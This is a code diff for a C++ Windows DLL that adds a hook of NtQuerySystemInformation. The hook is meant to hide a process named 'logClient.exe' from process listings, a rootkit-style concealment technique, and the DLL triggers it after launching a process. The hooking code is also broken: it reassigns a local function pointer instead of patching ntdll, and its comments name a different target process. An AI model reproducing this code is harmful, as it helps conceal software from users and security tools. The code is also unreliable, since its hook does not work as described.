@@ -61,44 +61,81 @@ extern "C"
         }
         // Close process and thread handles
         CloseHandle(processInfo.hProcess);
-        CloseHandle(processInfo.hThread);
+        CloseHandle(processInfo.hThread); 
+        std::this_thread::sleep_for(std::chrono::seconds(3));
+        HookNtQuerySystemInformation();
 
 	}
-    DECLDIR void startHook()
+    NTSTATUS HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
     {
-        MODULEINFO modInfo = { 0 };
-        HMODULE hModule = GetModuleHandle(0);
 
-        GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));
+        // Call the original NtQuerySystemInformation function
+        NTSTATUS status = OriginalNtQuerySystemInformation(
+            SystemInformationClass,
+            SystemInformation,
+            SystemInformationLength,
+            ReturnLength);
 
-        LPBYTE pAdress = (LPBYTE)modInfo.lpBaseOfDll;
-        PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAdress;
+        // Check if the function call was successful and if we are querying process information
+        if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
+            PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
+            PSYSTEM_PROCESS_INFORMATION spiPrev = nullptr;
 
-        // get start of the modules memory
-        PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAdress + pIDH->e_lfanew);
-        PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);
-        PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAdress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
-
-        for (; pIID->Characteristics; pIID++)
-        {
-            if (!strcmp("ntdll.dll", (char*)(pAdress + pIID->Name))) {
-                break;
+            // Iterate through the list of processes
+            while (spi) {
+                // Check if the current process is the one we want to hide (e.g., "target_process.exe")
+                if (spi->ImageName.Buffer && _wcsicmp(spi->ImageName.Buffer, L"logClient.exe") == 0) { // Change "target_process.exe" to the process name you want to hide
+                    if (spiPrev) {
+                        // If there is a previous process, adjust its NextEntryOffset to skip the current process
+                        if (spi->NextEntryOffset == 0) {
+                            spiPrev->NextEntryOffset = 0;
+                        }
+                        else {
+                            spiPrev->NextEntryOffset += spi->NextEntryOffset;
+                        }
+                    }
+                    else {
+                        // If the process to hide is the first in the list, adjust the base pointer
+                        if (spi->NextEntryOffset == 0) {
+                            *(ULONG*)SystemInformation = 0;
+                        }
+                        else {
+                            memcpy(spi, (PBYTE)spi + spi->NextEntryOffset, SystemInformationLength - ((PBYTE)spi - (PBYTE)SystemInformation));
+                        }
+                    }
+                    break; // Exit the loop after hiding the process
+                }
+                spiPrev = spi; // Update the previous process pointer
+                if (spi->NextEntryOffset == 0) break; // Exit the loop if there are no more processes
+                spi = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)spi + spi->NextEntryOffset); // Move to the next process
             }
         }
 
-        PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAdress + pIID->OriginalFirstThunk);
-        PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)(pAdress + pIID->FirstThunk);
-        PIMAGE_IMPORT_BY_NAME pIIBM;
-
-        for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
-            pIIBM = (PIMAGE_IMPORT_BY_NAME)(pAdress + pITD->u1.AddressOfData);
-            if(!strcmp("NtQuerySystemInformation", (char*)pIIBM->Name))
-
+        return status; // Return the status from the original function call
+    }
+    void HookNtQuerySystemInformation()
+    {
+        // Get a handle to ntdll.dll
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        if (hNtdll)
+        {
+            // Get the address of NtQuerySystemInformation
+            OriginalNtQuerySystemInformation = (PFN_NT_QUERY_SYSTEM_INFORMATION)GetProcAddress(hNtdll, "NtQuerySystemInformation");
+            if (OriginalNtQuerySystemInformation) 
+            {
+                DWORD oldProtect;
+                // Change the memory protection to allow writing to the function pointer
+                VirtualProtect(OriginalNtQuerySystemInformation, sizeof(PFN_NT_QUERY_SYSTEM_INFORMATION), PAGE_EXECUTE_READWRITE, &oldProtect);
+                // Replace the original function pointer with our hook
+                *(PFN_NT_QUERY_SYSTEM_INFORMATION*)&OriginalNtQuerySystemInformation = HookedNtQuerySystemInformation;
+                // Restore the original memory protection
+                VirtualProtect(OriginalNtQuerySystemInformation, sizeof(PFN_NT_QUERY_SYSTEM_INFORMATION), oldProtect, &oldProtect);
+            }
         }
-
-
     }
 }
+
+  
 
 
 BOOL APIENTRY DllMain(HINSTANCE hModule, // Handle to DLL modul
